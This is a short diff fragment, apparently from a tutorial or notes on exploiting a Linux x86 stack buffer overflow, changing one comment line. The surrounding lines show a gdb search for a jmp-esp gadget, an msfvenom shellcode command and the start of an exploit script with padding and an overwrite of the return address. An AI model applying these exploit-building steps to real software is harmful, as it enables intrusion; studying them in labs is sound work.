@@ -361,7 +361,7 @@ find /b 0xf7de1000,0xffffe000,0xff,0xe4
 
  msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
 
- ###ADD NOP STATEMENT AND BUF PAYLOAD TO SCRIPT### 
+ ###ADD NOP STATEMENT AND SHELLCODE TO SCRIPT### 
 #!/usr/bin/env python
 buff = "A" * 62
 eip = "\x59\x3b\xde\xf7"
